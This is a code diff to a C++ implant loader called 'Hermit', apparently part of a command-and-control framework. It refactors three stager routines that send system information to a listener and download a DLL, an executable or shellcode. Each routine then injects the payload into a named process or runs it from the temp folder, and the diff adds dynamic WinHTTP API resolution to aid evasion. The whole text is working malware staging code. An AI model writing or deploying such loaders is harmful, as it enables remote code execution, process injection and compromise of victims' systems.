@@ -2,24 +2,32 @@
 
 namespace Hermit
 {
-    BOOL LoadDLL()
+    VOID DLLLoader()
     {
+        // Load modules for dynamac API resolution.
+        HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
+        if (!hWinHTTPDLL)
+            return;
+
+        Procs::PPROCS pProcs = Procs::FindProcs(hWinHTTPDLL);
+
         HINTERNET hSession = NULL;
         HINTERNET hConnect = NULL;
         HINTERNET hRequest = NULL;
         BOOL bResults = FALSE;
 
         // Get system information as json.
-        std::wstring wInfoJson = Handler::GetInitialInfo();
-        std::string sInfoJson = Utils::Convert::UTF8Encode(wInfoJson);
+        std::wstring wInfoJSON = Handler::GetInitialInfoJSON();
+        std::string sInfoJSON = Utils::Convert::UTF8Encode(wInfoJSON);
 
         System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
+            pProcs,
             LISTENER_HOST_W,
             LISTENER_PORT
         );
         if (!handlers.hSession || !handlers.hConnect) {
-            System::Http::WinHttpCloseHandles(hSession, hConnect, NULL);
-            return FALSE;
+            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            return;
         }
 
         hSession = handlers.hSession;
@@ -27,19 +35,20 @@ namespace Hermit
 
         // Download a DLL file
         System::Http::WinHttpResponse resp = System::Http::SendRequest(
+            pProcs,
             hConnect,
             LISTENER_HOST_W,
             LISTENER_PORT,
             REQUEST_PATH_DOWNLOAD_W,
             L"POST",
             L"Content-Type: application/json\r\n",
-            (LPVOID)sInfoJson.c_str(),
-            (DWORD)strlen(sInfoJson.c_str())
+            (LPVOID)sInfoJSON.c_str(),
+            (DWORD)strlen(sInfoJSON.c_str())
         );
         if (!resp.bResult || resp.dwStatusCode != 200)
         {
-            System::Http::WinHttpCloseHandles(hSession, hConnect, NULL);
-            return FALSE;
+            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            return;
         }
 
         hRequest = resp.hRequest;
@@ -50,13 +59,13 @@ namespace Hermit
         size_t dwDllPathSize = (dllPath.size() + 1) * sizeof(wchar_t);
 
         // Download a DLL file
-        bResults = System::Http::WriteResponseData(hRequest, dllPath);
+        bResults = System::Http::WriteResponseData(pProcs, hRequest, dllPath);
         if (!bResults)
         {
-            System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);
-            return FALSE;
+            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            return;
         }
-        System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);
+        System::Http::WinHttpCloseHandles(pProcs, hSession, hConnect, hRequest);
 
         // Get target PID to inject DLL
         DWORD dwPid = System::Process::GetProcessIdByName(TEXT(PAYLOAD_PROCESS));
@@ -64,39 +73,39 @@ namespace Hermit
         // Inject DLL
         if (strcmp(PAYLOAD_TECHNIQUE, "dll-injection") == 0)
         {
-            bResults = Technique::Injection::DllInjection(dwPid, (LPVOID)dllPath.c_str(), dwDllPathSize);
-        }
-        else
-        {
-            return FALSE;
+            Technique::Injection::DllInjection(dwPid, (LPVOID)dllPath.c_str(), dwDllPathSize);
         }
 
-        if (!bResults)
-        {
-            return FALSE;
-        }
-
-        return TRUE;
+        Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+        return;
     }
 
-    BOOL LoadExecutable()
+    VOID ExecLoader()
     {
+        // Load modules for dynamac API resolution.
+        HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
+        if (!hWinHTTPDLL)
+            return;
+
+        Procs::PPROCS pProcs = Procs::FindProcs(hWinHTTPDLL);
+
         HINTERNET hSession = NULL;
         HINTERNET hConnect = NULL;
         HINTERNET hRequest = NULL;
         BOOL bResults = FALSE;
 
         // Get system information as json.
-        std::wstring wInfoJson = Handler::GetInitialInfo();
-        std::string sInfoJson = Utils::Convert::UTF8Encode(wInfoJson);
+        std::wstring wInfoJSON = Handler::GetInitialInfoJSON();
+        std::string sInfoJSON = Utils::Convert::UTF8Encode(wInfoJSON);
 
         System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
+            pProcs,
             LISTENER_HOST_W,
             LISTENER_PORT
         );
         if (!handlers.hSession || !handlers.hConnect) {
-            System::Http::WinHttpCloseHandles(hSession, hConnect, NULL);
-            return FALSE;
+            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            return;
         }
 
         hSession = handlers.hSession;
@@ -104,19 +113,20 @@ namespace Hermit
 
         // Download an executable
         System::Http::WinHttpResponse resp = System::Http::SendRequest(
+            pProcs,
             hConnect,
             LISTENER_HOST_W,
             LISTENER_PORT,
             REQUEST_PATH_DOWNLOAD_W,
             L"POST",
             L"Content-Type: application/json\r\n",
-            (LPVOID)sInfoJson.c_str(),
-            (DWORD)strlen(sInfoJson.c_str())
+            (LPVOID)sInfoJSON.c_str(),
+            (DWORD)strlen(sInfoJSON.c_str())
         );
         if (!resp.bResult || resp.dwStatusCode != 200)
         {
-            System::Http::WinHttpCloseHandles(hSession, hConnect, NULL);
-            return FALSE;
+            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            return;
         }
 
         hRequest = resp.hRequest;
@@ -126,49 +136,48 @@ namespace Hermit
         std::wstring execPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + execFileName;
         
         // Download an executable
-        if (!System::Http::WriteResponseData(hRequest, execPath))
+        if (!System::Http::WriteResponseData(pProcs, hRequest, execPath))
         {
-            System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);
-            return FALSE;
+            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            return;
         }
-        System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);
 
         // Execute
         if (strcmp(PAYLOAD_TECHNIQUE, "direct-execution") == 0)
         {
-            bResults = System::Process::ExecuteFile(execPath);
-        }
-        else
-        {
-            return FALSE;
+            System::Process::ExecuteFile(execPath);
         }
 
-        if (!bResults)
-        {
-            return FALSE;
-        }
-
-        return TRUE;
+        Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+        return;
     }
 
-    BOOL LoadShellcode()
+    VOID ShellcodeLoader()
     {
+        // Load modules for dynamac API resolution.     
+        HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
+        if (!hWinHTTPDLL)
+            return;
+
+        Procs::PPROCS pProcs = Procs::FindProcs(hWinHTTPDLL);
+
         HINTERNET hSession = NULL;
         HINTERNET hConnect = NULL;
         HINTERNET hRequest = NULL;
         BOOL bResults = FALSE;
 
         // Get system information as json.
-        std::wstring wInfoJson = Handler::GetInitialInfo();
-        std::string sInfoJson = Utils::Convert::UTF8Encode(wInfoJson);
+        std::wstring wInfoJSON = Handler::GetInitialInfoJSON();
+        std::string sInfoJSON = Utils::Convert::UTF8Encode(wInfoJSON);
 
         System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
+            pProcs,
             LISTENER_HOST_W,
             LISTENER_PORT
         );
         if (!handlers.hSession || !handlers.hConnect) {
-            System::Http::WinHttpCloseHandles(hSession, hConnect, NULL);
-            return FALSE;
+            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            return;
         }
 
         hSession = handlers.hSession;
@@ -176,27 +185,29 @@ namespace Hermit
 
         // Download shellcode
         System::Http::WinHttpResponse resp = System::Http::SendRequest(
+            pProcs,
             hConnect,
             LISTENER_HOST_W,
             LISTENER_PORT,
             REQUEST_PATH_DOWNLOAD_W,
             L"POST",
             L"Content-Type: application/json\r\n",
-            (LPVOID)sInfoJson.c_str(),
-            (DWORD)strlen(sInfoJson.c_str())
+            (LPVOID)sInfoJSON.c_str(),
+            (DWORD)strlen(sInfoJSON.c_str())
         );
         if (!resp.bResult || resp.dwStatusCode != 200)
         {
-            System::Http::WinHttpCloseHandles(hSession, hConnect, NULL);
-            return FALSE;
+            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            return;
         }
 
         hRequest = resp.hRequest;
 
-        std::vector<BYTE> respBytes = System::Http::ReadResponseBytes(hRequest);
+        std::vector<BYTE> respBytes = System::Http::ReadResponseBytes(pProcs, hRequest);
         if (respBytes.size() == 0)
         {
-            return FALSE;
+            Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+            return;
         }
 
         // Get target PID to inject DLL
@@ -205,22 +216,22 @@ namespace Hermit
         // Inject shellcode
         if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-injection") == 0)
         {
-            bResults = Technique::Injection::ShellcodeInjection(dwPid, respBytes);
-
-        }
-        else
-        {
-            return FALSE;
+            Technique::Injection::ShellcodeInjection(dwPid, respBytes);
         }
 
-        if (!bResults)
-        {
-            System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);
-            return FALSE;
-        }
+        Free(hWinHTTPDLL, pProcs, hSession, hConnect, hRequest);
+        return;
+    }
 
-        System::Http::WinHttpCloseHandles(hSession, hConnect, hRequest);
-
-        return TRUE;
+    VOID Free(
+        HMODULE hWinHTTPDLL,
+        Procs::PPROCS pProcs,
+        HINTERNET hSession,
+        HINTERNET hConnect,
+        HINTERNET hRequest
+    ) {
+        System::Http::WinHttpCloseHandles(pProcs, hSession, hConnect, hRequest);
+        delete pProcs;
+        FreeLibrary(hWinHTTPDLL);
     }
 }
